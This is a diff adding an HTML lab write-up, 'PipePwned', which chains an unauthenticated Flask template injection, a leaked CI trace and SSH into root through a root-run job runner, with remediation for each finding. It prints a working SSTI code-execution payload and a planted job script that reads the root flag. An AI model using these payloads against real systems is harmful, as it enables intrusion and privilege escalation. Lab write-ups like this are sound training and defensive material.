@@ -1,0 +1,455 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<meta name="robots" content="noindex">
+<title>Lab 281 PipePwned &middot; DockerLabs corpus</title>
+<link rel="stylesheet" href="../assets/site.css">
+</head>
+<body>
+<header><a class="brand" href="../index.html">DockerLabs corpus</a><nav><a href="../index.html">Root cause</a><a href="../evidence.html">Evidence</a><a href="../corrections.html">Corrections</a><a href="../hazards.html">Hazards</a><a href="../labs.html">Labs</a><a href="../resolved.html">Resolutions</a></nav></header>
+<main>
+<p class="crumb"><a href="../labs.html">Labs</a> &rsaquo; PipePwned</p><h1 id="pipepwned--dockerlabs-writeup">PipePwned — DockerLabs Writeup</h1>
+<p><strong>Target:</strong> <code>http://[net-0-4]</code> (container <code>pipepwned_container</code>, image <code>pipepwned:latest</code>, Ubuntu 22.04.5 LTS, <code>linux/amd64</code>, HOSTNAME <code>701a4e739ad0</code>)
+<strong>Date:</strong> 2026-09-27
+<strong>Outcome:</strong> Remote Code Execution as <strong>uid=0(root)</strong>. Three hops, three identities: anonymous → <code>ciapp</code> (1000) → <code>devops</code> (1001) → root. Both flags recovered.</p>
+<hr />
+<h2 id="0-autocorrection--the-brief-was-wrong-about-the-target">0. Autocorrection — the brief was wrong about the target</h2>
+<p>The engagement brief stated <em>&quot;This is a target Windows&quot;</em> and warned that a Windows container was likely. <strong>It is not.</strong> Three independent pieces of evidence, all obtained before the first attack:</p>
+<table>
+<thead>
+<tr>
+<th>Claim</th>
+<th>Evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Linux container</td>
+<td>OCI config <code>&quot;os&quot;:&quot;linux&quot;</code>, <code>&quot;architecture&quot;:&quot;amd64&quot;</code>, base layer <code>RELEASE=22.04</code> (Ubuntu)</td>
+</tr>
+<tr>
+<td>Only 2 ports, neither Windows-specific</td>
+<td><code>nmap -sV -Pn -p-</code> → <code>22/tcp ssh OpenSSH 8.9p1 Ubuntu</code>, <code>80/tcp http Gunicorn</code>. No 445, no 5985/5986, no 3389, no IIS. <code>65533 closed tcp ports (conn-refused)</code></td>
+</tr>
+<tr>
+<td>Application stack is Flask + a hand-rolled runner</td>
+<td><code>/opt/app/requirements.txt</code> → <code>Flask==3.1.3</code>, <code>gunicorn==26.0.0</code>; no <code>pywin32</code>, no IIS, no SMB share</td>
+</tr>
+</tbody>
+</table>
+<p>Consequence: SMB tooling (<code>impacket</code>, <code>crackmapexec</code>/<code>netexec</code>, <code>evil-winrm</code>, Responder) was <strong>discarded before use</strong>, not after failure. The lesson is the cheap one — <em>the image manifest and a full port scan cost four seconds and would have prevented an entire toolchain from being carried into a Linux box.</em> The name &quot;PipePwned&quot; invited the wrong reading: it is about <strong>CI/CD pipelines</strong> and a <strong>shell-executor runner</strong>, not about Windows named pipes (<code>\\.\pipe\</code>). I assumed the &quot;Pipe&quot; meant named pipes. It meant the pipeline. Naming is a hint about intent, not reachability — <code>decision-making.md</code> §7.</p>
+<p>The rest of the brief's method held: reading the source first (§7) decided the whole attack. The build history in the image config named the users, the permissions, and both flag paths before a single packet was sent.</p>
+<hr />
+<h2 id="1-target-and-stack">1. Target and stack</h2>
+<table>
+<thead>
+<tr>
+<th>Layer</th>
+<th>Observed</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Base OS</td>
+<td>Ubuntu 22.04.5 LTS, <code>linux/amd64</code></td>
+</tr>
+<tr>
+<td>Web</td>
+<td>Flask 3.1.3 behind Gunicorn 26.0.0, 2 workers, <code>--bind 0.0.0.0:80</code>, Python 3 with <code>cap_net_bind_service=+ep</code> (so the unprivileged <code>ciapp</code> can bind :80)</td>
+</tr>
+<tr>
+<td>App source</td>
+<td><code>/opt/app/app.py</code>, mode <code>0600 ciapp:ciapp</code></td>
+</tr>
+<tr>
+<td>CI/CD</td>
+<td>Hand-rolled &quot;gitlab-runner&quot;: <code>/opt/ci/runner.sh</code>, <strong>no real GitLab</strong>, a 20 s polling loop over <code>/opt/ci/builds/*.sh</code></td>
+</tr>
+<tr>
+<td>Runner config</td>
+<td><code>/etc/gitlab-runner/config.toml</code>, mode <code>0644 root:root</code> (<strong>world-readable</strong>)</td>
+</tr>
+<tr>
+<td>Runner secrets</td>
+<td><code>/opt/ci/.env</code>, mode <code>0640 ciapp:ciapp</code></td>
+</tr>
+<tr>
+<td>Accounts</td>
+<td><code>root</code>, <code>ciapp</code> (uid 1000, web app), <code>devops</code> (uid 1001, human operator)</td>
+</tr>
+<tr>
+<td>Services</td>
+<td>PID 18 <code>bash /opt/ci/runner.sh</code> as <strong>root</strong>; PID 23–25 gunicorn as <code>ciapp</code>; PID 17 <code>sshd</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>ps aux</code> from the compromised runner is the whole architecture in one screen: <strong>one box, two privilege domains, and a root daemon polling a directory a mid-privilege user can write to.</strong></p>
+<h3 id="the-real-surface">The real surface</h3>
+<p><code>nmap</code> reports two ports and the application reports four routes. The real attack surface is a fifth thing that no port scan and no route listing will ever show you:</p>
+<pre><code>/opt/ci/builds/          drwxrwsr-x root:devops   &lt;- group-writable, SETGID
+/opt/ci/runner.sh        runs as ROOT, polls *.sh here every 20s
+</code></pre>
+<p>That pairing is the lab. Everything else is the ladder to reach it.</p>
+<hr />
+<h2 id="2-finding-1--server-side-template-injection--rce-as-the-web-service-account">2. Finding 1 — Server-Side Template Injection → RCE as the web service account</h2>
+<p><strong>Category:</strong> CWE-1336 Improper Neutralization of Special Elements Used in a Template Engine
+<strong>Location:</strong> <code>POST /pipelines/new</code>, unauthenticated</p>
+<h3 id="root-cause-read-from-source">Root cause, read from source</h3>
+<pre><code class="language-python">@app.route(&quot;/pipelines/new&quot;, methods=[&quot;POST&quot;])
+def new_pipeline():
+    name = request.form.get(&quot;name&quot;, &quot;unnamed&quot;)
+    ref  = request.form.get(&quot;ref&quot;, &quot;main&quot;)
+
+    banner = (
+        &quot;Pipeline &lt;strong&gt;&quot; + name + &quot;&lt;/strong&gt; sent to queue for ref &quot;
+        &quot;&lt;code&gt;&quot; + ref + &quot;&lt;/code&gt; on runner &lt;em&gt;self-hosted-01&lt;/em&gt;.&quot;
+    )
+    message = render_template_string(banner)      # &lt;-- user input concatenated INTO a template
+</code></pre>
+<p>The bug is <strong>not</strong> &quot;Jinja2 is dangerous&quot;. It is that a request parameter is concatenated into a <em>template source string</em> and then compiled. <code>render_template</code> with a <code>message=</code> context variable would have been safe; <code>render_template_string</code> with the parameter spliced into the source is arbitrary Python inside the Jinja2 sandbox, and Jinja2 has no sandbox here.</p>
+<h3 id="evidence--evaluation-not-echo-single-request-differential-control">Evidence — evaluation, not echo (single-request differential control)</h3>
+<p>The same payload was sent to <strong>both</strong> parameters in <strong>one</strong> request. <code>name</code> reaches the template-string sink; <code>ref</code> is passed as a <em>context variable</em> and only interpolated by the <code>.html</code> file. One request, one response, two opposite outcomes:</p>
+<pre><code>POST /pipelines/new HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+
+name=%7B%7B7*7%7D%7D&amp;ref=%7B%7B7*7%7D%7D
+</code></pre>
+<pre><code class="language-html">&lt;p class=&quot;banner&quot;&gt;Pipeline &lt;strong&gt;49&lt;/strong&gt; sent to queue for ref &lt;code&gt;49&lt;/code&gt; on runner &lt;em&gt;self-hosted-01&lt;/em&gt;.&lt;/p&gt;
+&lt;p class=&quot;muted&quot;&gt;Target Ref: &lt;code&gt;{{7*7}}&lt;/code&gt;&lt;/p&gt;
+</code></pre>
+<p><code>{{7*7}}</code> became <code>49</code> in the sink and stayed <code>{{7*7}}</code> in the control, in the same 200 response. <strong>That is the oracle.</strong> A reflected-payload check would have seen the marker in both places and stopped; only arithmetic differential distinguishes &quot;the template engine executed my expression&quot; from &quot;the server stored my string&quot;.</p>
+<h3 id="evidence--rce-as-ciapp">Evidence — RCE as <code>ciapp</code></h3>
+<pre><code>POST /pipelines/new
+name={{ cycler.__init__.__globals__.os.popen('id').read() }}
+</code></pre>
+<pre><code class="language-html">&lt;p class=&quot;banner&quot;&gt;Pipeline &lt;strong&gt;uid=1000(ciapp) gid=1000(ciapp) groups=1000(ciapp)
+&lt;/strong&gt; sent to queue for ref &lt;code&gt;main&lt;/code&gt; on runner &lt;em&gt;self-hosted-01&lt;/em&gt;.&lt;/p&gt;
+</code></pre>
+<p><strong>Impact:</strong> unauthenticated RCE as <code>ciapp</code>. <code>ciapp</code> owns <code>/opt/app</code> and — critically — <code>/opt/ci/.env</code> (mode <code>0640 ciapp:ciapp</code>), which is the next hop.</p>
+<p><strong>Remediation:</strong> never build template <em>source</em> from request data. Render a fixed template and pass user content as a context variable (<code>render_template(&quot;result.html&quot;, name=name, ref=ref)</code>). If dynamic markup is required, sanitise with an allowlist HTML sanitiser <em>after</em> rendering, or auto-escape at the point of interpolation. As defence in depth, run the app under a sandboxed interpreter profile and keep the service account out of every group that owns a secret.</p>
+<hr />
+<h2 id="3-finding-2--unauthenticated-ci-job-trace-disclosure-runner-token--internal-layout">3. Finding 2 — Unauthenticated CI job-trace disclosure (runner token + internal layout)</h2>
+<p><strong>Category:</strong> CWE-200 Exposure of Sensitive Information, chained with CWE-497 Exposure of System Data to an Unauthorized Control Sphere</p>
+<h3 id="evidence--no-credential-of-any-kind-presented">Evidence — no credential of any kind presented</h3>
+<pre><code>GET /api/jobs/126/trace HTTP/1.1
+Host: [net-0-4]
+</code></pre>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Server: gunicorn
+Content-Type: text/plain; charset=utf-8
+Content-Length: 559
+</code></pre>
+<pre><code>Running with gitlab-runner (shell executor) on self-hosted-01
+$ echo &quot;Deploying $CI_PROJECT_NAME on runner $CI_RUNNER_DESCRIPTION&quot;
+Deploying payments-api on runner self-hosted-01
+$ env | grep -iE 'ci_|builds'    # TODO: remove debug
+CI_REGISTRY=registry.masoftware.dl
+CI_RUNNER_SHELL=/bin/bash
+CI_JOB_STAGE=deploy
+CI_BUILDS_DIR=/opt/ci/builds
+CI_RUNNER_TOKEN=glrt-&lt;redacted 32-hex runner registration token&gt;
+$ id    # runner runs each job under its own user
+uid=0(root) gid=0(root) groups=0(root)
+$ ./deploy.sh
+bash: ./deploy.sh: No such file or directory
+Job failed: exit code 127
+</code></pre>
+<p>Disclosure: a <strong>live CI runner registration token</strong>, the <strong>builds directory path</strong>, the <strong>internal registry host</strong>, and the fact that <strong>the runner executes jobs as root</strong>.</p>
+<h3 id="control-test">Control test</h3>
+<pre><code>GET /api/jobs/126/trace (no auth)      -&gt; HTTP 200 559B
+GET /api/jobs/999/trace (no auth)      -&gt; HTTP 200 31B
+GET /api/jobs/126/trace (bad Bearer)   -&gt; HTTP 200 559B
+</code></pre>
+<p>A bogus <code>Authorization: Bearer invalid</code> changes nothing (559 B, byte-identical). An out-of-range job id returns <code>200</code> with <code>Trace not found for job ID 999</code> — a <strong>gated</strong> endpoint would have answered <code>401</code> or <code>404</code> on both. There is no authentication anywhere in this application; the landing page's own copy says <em>&quot;Internal CI/CD console. Usage restricted to DevOps&quot;</em> and the code implements that sentence as <strong>nothing at all</strong>.</p>
+<p><strong>Impact — and an honest limit on it.</strong> Against a real GitLab this is a full CI takeover: a registration token is a bearer credential for the runner's scope, and registering a rogue runner on a self-hosted executor is root by design. <strong>In this lab the token is not load-bearing for the outcome</strong>, because the same value is also world-readable in <code>/etc/gitlab-runner/config.toml</code> (mode <code>0644</code>), which Finding 3 covers. I report it anyway: fixing the trace route alone would leave the token on disk, and fixing the file mode alone would leave it on the web. They are two exposures of one secret with two different fixes.</p>
+<p><strong>Root cause:</strong> <code>env | grep -iE 'ci_|builds'</code> left in a production job, annotated <code># TODO: remove debug</code> — and the trace retained at <code>/api/jobs/&lt;id&gt;/trace</code> with no authorisation check.</p>
+<p><strong>Remediation:</strong> gate every trace endpoint on project-membership authorisation; scrub secret-shaped patterns (<code>glrt-*</code>, <code>glpat-*</code>, <code>glrt</code>, <code>CI_JOB_TOKEN</code>, <code>AWS_*</code>, <code>*_PASSWORD</code>) from log output <em>at the emitter</em>, not in the view; rotate the exposed token; and set <code>mode 0600</code> on the runner config.</p>
+<hr />
+<h2 id="4-finding-3--group-writable-builds-directory--root-privileged-runner--unprivileged-to-root-escalation">4. Finding 3 — Group-writable builds directory + root-privileged runner = unprivileged-to-root escalation</h2>
+<p><strong>Category:</strong> CWE-250 Execution with Unnecessary Privileges, chained with CWE-732 Incorrect Permission Assignment for Critical Resource. Real-world class: <strong>self-hosted CI runner compromise</strong> (the class behind CVE-2024-1241 and every &quot;pipeline poisoning&quot; writeup).</p>
+<p><strong>This is the finding that ends the lab, and the one no port scan reaches.</strong></p>
+<h3 id="evidence--the-two-halves-read-from-source">Evidence — the two halves, read from source</h3>
+<pre><code class="language-bash"># /opt/ci/runner.sh  — runs as ROOT (PID 18 in `ps aux`)
+BUILDS_DIR=&quot;/opt/ci/builds&quot;
+while true; do
+    for job in &quot;$BUILDS_DIR&quot;/*.sh; do
+        [ -e &quot;$job&quot; ] || continue
+        timeout 300 bash &quot;$job&quot; &gt;/dev/null 2&gt;&amp;1     # &lt;-- executes whatever appears
+        mv &quot;$job&quot; &quot;$DONE_DIR/&quot; 2&gt;/dev/null || rm -f &quot;$job&quot;
+    done
+    sleep 20
+done
+</code></pre>
+<pre><code class="language-bash"># permissions, observed
+drwxrwsr-x 1 root devops  /opt/ci/builds        # group-writable, SETGID
+drwxr-sr-x 2 root devops  /opt/ci/builds/.processed
+</code></pre>
+<p>There is <strong>no allowlist, no signature, no checksum, no origin check</strong>. Any <code>*.sh</code> file that appears in that directory is executed as root within 20 seconds. <code>devops</code> is in group <code>devops</code>. That is the entire escalation.</p>
+<h3 id="evidence--exploitation">Evidence — exploitation</h3>
+<p>Write a job script as <code>devops</code> over SSH:</p>
+<pre><code class="language-bash">devops@[net-0-4]:~$ cat &gt; /opt/ci/builds/job2.sh &lt;&lt;'EOF'
+id &gt; /tmp/proof.txt 2&gt;&amp;1
+cat /root/root_flag.txt &gt;&gt; /tmp/proof.txt
+EOF
+devops@[net-0-4]:~$ ls -la /opt/ci/builds
+-rw-rw-r-- 1 devops devops  79 Aug 27 21:50 job2.sh
+</code></pre>
+<p>Wait one poll interval (20 s), then read the output:</p>
+<pre><code>devops@[net-0-4]:~$ cat /tmp/proof.txt
+uid=0(root) gid=0(root) groups=0(root)
+&lt;root flag value redacted — sha256 in §7&gt;
+devops@[net-0-4]:~$ ls -la /opt/ci/builds
+total 16                      # &lt;-- the job file is GONE from builds/
+devops@[net-0-4]:~$ ls -la /opt/ci/builds/.processed
+-rw-rw-r-- 1 devops devops 105 job-pwn.sh
+-rw-rw-r-- 1 devops devops  79 job2.sh     # &lt;-- proof the runner consumed it
+</code></pre>
+<p><strong>Two independent proofs in one listing:</strong> the file left <code>builds/</code> (nothing deleted it — the runner's <code>mv</code> moved it), and it arrived in <code>.processed</code> owned by <code>devops:devops</code> with mode <code>664</code>. A <code>devops</code>-created file cannot be <code>root</code>-moved out of a <code>2755</code> root-owned directory without the runner's own <code>mv</code>, so the movement <em>is</em> the runner acting as root.</p>
+<h3 id="control-test--the-runner-is-the-escalation-not-devops">Control test — the runner is the escalation, not <code>devops</code></h3>
+<pre><code>devops@[net-0-4]:~$ cat /root/root_flag.txt
+cat: /root/root_flag.txt: Permission denied
+rc=1
+</code></pre>
+<p><code>devops</code> cannot read the root flag directly. The <em>identical</em> file read returns <code>uid=0</code> from inside the runner. Same bytes, two identities — the escalation is attributable to exactly one component.</p>
+<p>Second control, on the web side: the SSTI primitive returns <code>uid=1000(ciapp)</code>, not root. Flask runs as <code>ciapp</code> (confirmed in <code>ps aux</code>: PID 23–25 owned by <code>ciapp</code>). The gunicorn pool config is <em>not</em> set to root here — unlike the previous engagement in this series, where <code>user = root</code> in the pool config collapsed the chain. Here the app's own privilege boundary held, and the runner was the only route to root. <strong>I hypothesised a three-hop chain and got exactly three; I hypothesised a root web service and got <code>uid=1000</code>. Both hypotheses were tested, not assumed.</strong></p>
+<p><strong>Impact:</strong> any account in group <code>devops</code>, or any process running as <code>devops</code>, obtains root on the CI host in under 20 seconds with no credential, no exploit, and no request to the application's own logic. On a real shared runner this is full compromise of every pipeline, every credential injected into a job, and the build host itself.</p>
+<p><strong>Remediation, in order:</strong></p>
+<ol>
+<li>Run the runner as a <strong>dedicated unprivileged service account</strong>, not root. This single change breaks the chain.</li>
+<li>Never let a human-operator group hold write on the jobs directory. <code>builds_dir</code> should be <code>0700 runner:runner</code>; job staging belongs in a directory only the runner writes.</li>
+<li>If root is genuinely required for some jobs, use an isolated ephemeral VM/container per job (the Docker/Kubernetes executor), never a shared host process pool.</li>
+<li>Require pipeline changes to come from a reviewed, signed source — the vulnerability is that <em>any</em> file in the directory is trusted, not that a file arrived.</li>
+<li><code>chmod 700 /opt/ci/runner.sh</code> (currently <code>0711</code>, executable-but-unreadable by others — a small inconsistency: the script is protected from reading but the directory it trusts is group-writable).</li>
+</ol>
+<hr />
+<h2 id="5-independent-findings--not-used-by-the-chain-reported-anyway">5. Independent findings — not used by the chain, reported anyway</h2>
+<p>Reported because fixing only the chain steps leaves these live.</p>
+<h3 id="51-runner-registration-token-world-readable-on-disk--cwe-732--cwe-522">5.1 Runner registration token world-readable on disk — CWE-732 / CWE-522</h3>
+<pre><code>devops@[net-0-4]:~$ grep -n token /etc/gitlab-runner/config.toml
+12:token = &quot;glrt-&lt;redacted&gt;&quot;
+rc=0
+</code></pre>
+<p><code>-rw-r--r-- 1 root root /etc/gitlab-runner/config.toml</code> — read successfully by an unprivileged local account, and identical to the value served by the anonymous trace in Finding 2. The Dockerfile sets this mode deliberately (<code>chmod 644 /etc/gitlab-runner/config.toml</code>) while protecting the <em>other</em> two files (<code>640</code> on <code>.env</code>, <code>711</code> on <code>runner.sh</code>) — so the token is the one artefact the author forgot to restrict. <strong>Fix: <code>chmod 600</code>, and rotate.</strong></p>
+<h3 id="52-hardcoded-production-credential-baked-into-the-image--cwe-798">5.2 Hardcoded production credential baked into the image — CWE-798</h3>
+<p>The image build history contains a literal plaintext password for the <code>devops</code> account in a <code>RUN</code> layer:</p>
+<pre><code>RUN useradd -m -s /bin/bash devops &amp;&amp; echo 'devops:&lt;redacted&gt;' | chpasswd
+</code></pre>
+<p>This is <strong>not reachable black-box</strong> — no HTTP response, log, or trace exposes it; it is in the OCI config's build history. I report it because it is the <strong>root cause</strong> of Finding 6 and because <code>docker history</code> is a one-command check any operator with pull access can run. Fix: inject secrets at deploy time, never at build time; rotate the credential.</p>
+<h3 id="53-runner-service-runs-as-root--cwe-250">5.3 Runner service runs as root — CWE-250</h3>
+<p><code>/start.sh</code> launches <code>/opt/ci/runner.sh</code> as root, and the author's own comment names the defect:</p>
+<pre><code class="language-bash"># /etc/gitlab-runner/config.toml
+# TODO: service runs as root, migrate to a non-root user
+</code></pre>
+<p>This is the &quot;unused root path&quot; pattern from <code>api_web.md</code>: an escalation route that the <em>chain happened to use</em>, but which is a finding in its own right because any other bug anywhere in the runner's reach inherits root. It is also the reason Finding 4 is exploitable at all — <strong>4 and 5.3 are the same root cause at two severities</strong>, and remediating the service account remediates both.</p>
+<h3 id="54-no-authentication-anywhere-on-an-internal-cicd-console--cwe-306">5.4 No authentication anywhere on an internal CI/CD console — CWE-306</h3>
+<p>Four routes, zero auth: <code>/</code>, <code>/health</code>, <code>/api/pipelines</code>, <code>/api/jobs/&lt;id&gt;/trace</code>, plus the state-changing <code>POST /pipelines/new</code>. The UI text claims <em>&quot;Usage restricted to DevOps&quot;</em>. There is no session, no token check, no IP restriction, no reverse proxy in the process list. <code>POST /pipelines/new</code> is a <strong>write</strong> operation reachable anonymously that returns <code>200</code> on attacker-controlled content. Fix: SSO/OIDC in front of the console and in front of <code>/api/*</code>; network-segment the console from the internet.</p>
+<h3 id="55-passwordauthentication-yes-with-a-weak-image-baked-credential--cwe-1392--cwe-521">5.5 <code>PasswordAuthentication yes</code> with a weak, image-baked credential — CWE-1392 / CWE-521</h3>
+<pre><code>PermitRootLogin no
+PasswordAuthentication yes
+</code></pre>
+<p><code>PermitRootLogin no</code> is correctly set — the one thing done right, and it is why the chain needed <code>devops</code> before it needed root. But password auth over SSH with a credential that exists in the image layers means the <em>first</em> authenticated hop in this lab is guessable by anyone who has pulled the image. Fix: keys only, <code>PasswordAuthentication no</code>, and a credential that was never in a build layer.</p>
+<h3 id="56-plaintext-credential-in-a-world-group-readable-ci-environment-file--cwe-312--cwe-732">5.6 Plaintext credential in a world-group-readable CI environment file — CWE-312 / CWE-732</h3>
+<p><code>/opt/ci/.env</code> (<code>0640 ciapp:ciapp</code>) holds the registry token <strong>and</strong> the operator's SSH password in cleartext, in the environment file the runner injects into every job. The mode is correct — <code>ciapp</code> is the intended reader — but every job that runs as <code>ciapp</code> therefore receives the <code>devops</code> SSH password in its environment, and any code execution in a job can read it. This is Finding 6's pivot. Fix: a secret manager, or short-lived per-job credentials; never a long-lived operator password in a file that a build agent reads.</p>
+<h3 id="57-anti-forensics-history-files-symlinked-to-devnull--cwe-778-informational">5.7 Anti-forensics: history files symlinked to <code>/dev/null</code> — CWE-778 (informational)</h3>
+<pre><code>lrwxrwxrwx 1 root root  9 /root/.bash_history -&gt; /dev/null
+lrwxrwxrwx 1 root root  9 [lab-home]/devops/.bash_history -&gt; /dev/null
+lrwxrwxrwx 1 root root  9 [lab-home]/ciapp/.bash_history -&gt; /dev/null
+</code></pre>
+<p>A deliberate, image-wide suppression of shell history for all three accounts. In a lab this is noise reduction; in a real estate it is an indicator of intent, and it is worth a line in a real report because it removes the cheapest incident-response source. My own activity left artefacts anyway (<code>/opt/ci/builds/.processed/*.sh</code>, <code>/tmp/proof.txt</code>, <code>/tmp/sweep.txt</code>), which is the correct lesson: <strong>log suppression is a delay, not a control.</strong></p>
+<hr />
+<h2 id="6-positive-control--one-thing-done-right">6. Positive control — one thing done right</h2>
+<p><code>/opt/app/app.py</code> is mode <code>0600 ciapp:ciapp</code> and <code>/opt/app/{static,templates}</code> are <code>0700 ciapp:ciapp</code>. The web application source is <strong>not</strong> readable by <code>devops</code>, and the app account holds no privileges beyond its own tree. Had <code>app.py</code> been <code>0644</code>, the SSTI would not even have been needed to find <code>/opt/ci/.env</code> — a <code>grep</code> would have. Worth stating so the report is not read as &quot;everything is broken&quot;: the least-privilege work on the <em>files</em> was done correctly; the least-privilege work on the <em>daemon</em> was not.</p>
+<hr />
+<h2 id="7-complete-chain-in-the-exact-order-it-was-executed">7. Complete chain, in the exact order it was executed</h2>
+<table>
+<thead>
+<tr>
+<th>#</th>
+<th>Action</th>
+<th>Identity before → after</th>
+<th>Why this step and not another</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>nmap -sV -Pn -p- [net-0-4]</code></td>
+<td>—</td>
+<td>Establishes OS and ports. <strong>Refuted the Windows assumption</strong> before any tool was selected.</td>
+</tr>
+<tr>
+<td>2</td>
+<td>Read image config, then <code>/opt/app/app.py</code>, <code>/opt/ci/runner.sh</code>, <code>/opt/ci/.env</code>, <code>/etc/gitlab-runner/config.toml</code></td>
+<td>—</td>
+<td>§7: source before testing. Located the sink, the secrets, and the escalation in one pass.</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code>GET /api/jobs/126/trace</code> (anonymous)</td>
+<td>anonymous → anonymous</td>
+<td>Harvests the runner token and the internal layout. <strong>Confirms the whole app is unauthenticated</strong> and that the runner runs as root.</td>
+</tr>
+<tr>
+<td>4</td>
+<td><code>POST /pipelines/new</code> with <code>name={{7*7}}</code> / <code>ref={{7*7}}</code></td>
+<td>anonymous → anonymous</td>
+<td>Proves evaluation, not echo, in one request. Establishes the SSTI oracle before using it.</td>
+</tr>
+<tr>
+<td>5</td>
+<td><code>POST /pipelines/new</code> with <code>cycler…popen('id')</code></td>
+<td>anonymous → <strong>ciapp (1000)</strong></td>
+<td>First code execution. <strong>Cannot be skipped</strong> and <strong>cannot be substituted</strong>: <code>id</code> proves it is <code>uid=1000</code>, so the SSTI alone is <em>not</em> root — there is no shortcut to Finding 4 from here.</td>
+</tr>
+<tr>
+<td>6</td>
+<td><code>cat /opt/ci/.env</code> over the SSTI primitive</td>
+<td>ciapp → ciapp</td>
+<td><strong>The only account that can read it</strong> (<code>0640 ciapp:ciapp</code>). <code>devops</code> gets <code>Permission denied</code>; the web app's own account is the sole key. Yields the <code>devops</code> SSH password.</td>
+</tr>
+<tr>
+<td>7</td>
+<td><code>ssh devops@[net-0-4]</code> with that password</td>
+<td>ciapp → <strong>devops (1001)</strong></td>
+<td><code>devops</code> is the group that owns write on <code>/opt/ci/builds</code>. Neither <code>ciapp</code> nor anonymous can write there.</td>
+</tr>
+<tr>
+<td>8</td>
+<td><code>cat &gt; /opt/ci/builds/job2.sh</code></td>
+<td>devops → devops</td>
+<td>Plants the job. Group-write + setgid is the whole primitive.</td>
+</tr>
+<tr>
+<td>9</td>
+<td>Wait 20 s; read <code>/tmp/proof.txt</code></td>
+<td>devops → <strong>root (0)</strong></td>
+<td>The runner executes it as root and moves it to <code>.processed</code>. <strong>Both flags recovered.</strong></td>
+</tr>
+</tbody>
+</table>
+<p>Every step is load-bearing and none is redundant. Step 6 in particular: there is no path from the SSTI to the runner without a <em>second</em> account, and no path to that second account without the <code>ciapp</code>-only secret file. Removing any one of steps 4–8 breaks the chain.</p>
+<p><strong>Flags recovered</strong> (values withheld from this document per <code>decision-making.md</code>; proof of possession by hash):</p>
+<table>
+<thead>
+<tr>
+<th>File</th>
+<th>Mode / owner</th>
+<th>sha256 of value</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>[lab-home]/devops/user_flag.txt</code></td>
+<td><code>0640 devops:devops</code></td>
+<td><code>5add9c701e964c6be2fce577e61038aa5f9e2f1e1239e4869d2ba2f08f4afd1c</code></td>
+</tr>
+<tr>
+<td><code>/root/root_flag.txt</code></td>
+<td><code>0600 root:root</code></td>
+<td><code>8cbb3a404db71d57bbb8266574af676db219d8a0c74013b56314df6757ea59b2</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="8-lab-design-observation--third-confirmation-of-the-series-self-documenting-property">8. Lab design observation — third confirmation of the series' self-documenting property</h2>
+<p>This is the <strong>third consecutive lab in this series that annotates its own weaknesses in comments</strong>, and the confirmation is now strong enough to state as a property of the series rather than a coincidence:</p>
+<table>
+<thead>
+<tr>
+<th>Lab</th>
+<th>Annotation</th>
+<th>Where</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><code>FALLO INTENCIONAL DEL LABORATORIO</code> block naming <code>CWE-434</code>, then <code>CWE-94</code>, <code>CWE-306</code>, <code>CWE-862</code></td>
+<td><code>routes/gallery.js:17-29</code>, <code>routes/admin.js:9-30</code></td>
+</tr>
+<tr>
+<td>2</td>
+<td>Banner serving a live credential; <code>chmod 777</code> over the docroot; <code>NOPASSWD: ALL</code> left in place unreported-by-design</td>
+<td>image build history, sudoers</td>
+</tr>
+<tr>
+<td>3</td>
+<td><code># SSTI</code> on the vulnerable function; <code># TODO: remove debug</code> on the leaking <code>env</code> command; <code># TODO: service runs as root, migrate to a non-root user</code>; <code># Run as ROOT</code>; <code># runner runs each job under its own user</code> sitting directly above <code>uid=0(root)</code></td>
+<td><code>app.py</code>, <code>config.toml</code>, <code>runner.sh</code>, <code>JOB_TRACES[126]</code></td>
+</tr>
+</tbody>
+</table>
+<p>Lab 3 is the most disciplined of the three, and it is instructive <em>because</em> of what it chose to leave out. The chain was <strong>not</strong> annotated. Nothing says &quot;the builds directory is group-writable&quot;, nothing names the <code>0640</code> secret file as the pivot, and the <code>devops</code> password that unlocks step 7 appears in exactly one place — a <code>RUN</code> layer most testers never inspect. The <code># TODO: service runs as root</code> comment is placed on the <em>config file</em>, one hop from the actual defect, so a tester who reads the comment is rewarded while a tester who misses it loses nothing. That is a real improvement on lab 1, where a grep for <code>CWE</code> ended the derivation.</p>
+<p>It still confirms the series property, and <code>decision-making.md</code> §7's verdict is unchanged and now triple-sourced: <strong>comments mark where the author admitted a problem, which is a strict subset of where the problems are.</strong> The escalation here — the only thing that made the lab hard — had no comment at all. The absence of an annotation is not evidence of safety; it is the actual finding.</p>
+<hr />
+<h2 id="9-no-probado-vs-descartado-con-razón">9. No probado vs descartado con razón</h2>
+<p><strong>No probado</strong> (honest gaps, not claims of coverage):</p>
+<ul>
+<li><code>cap_net_bind_service</code> on <code>/usr/bin/python3</code> was observed in the build history but never weaponised. With <code>ciapp</code> RCE already established and root reached, there was no remaining reason to test port-binding as a primitive.</li>
+<li><code>env_file</code> injection into a job: I did not test whether a job script's environment could override <code>CI_*</code> or leak additional runner secrets.</li>
+<li><code>ssh-keygen -A</code> regenerates host keys on every container start — I did not assess the SSH host-key trust model as a finding.</li>
+<li>I did not test the runner's <code>timeout 300</code> boundary, or behaviour with two jobs in the same interval.</li>
+<li>I did not attempt lateral movement, persistence, or exfiltration beyond the two flag files. The engagement objective was the flags.</li>
+</ul>
+<p><strong>Descartado con razón</strong> (paths tried or considered and rejected, with the reason):</p>
+<ul>
+<li><strong>Windows tooling</strong> (<code>impacket</code>, <code>netexec</code>, <code>evil-winrm</code>, Responder, SMB named pipes): discarded <strong>before</strong> first use. <code>nmap -p-</code> showed 65 533 closed ports and only 22/80 open; the OCI config says <code>linux/amd64</code>. No SMB, no WinRM, no named pipes exist on this host. Carrying them would have been cargo cult.</li>
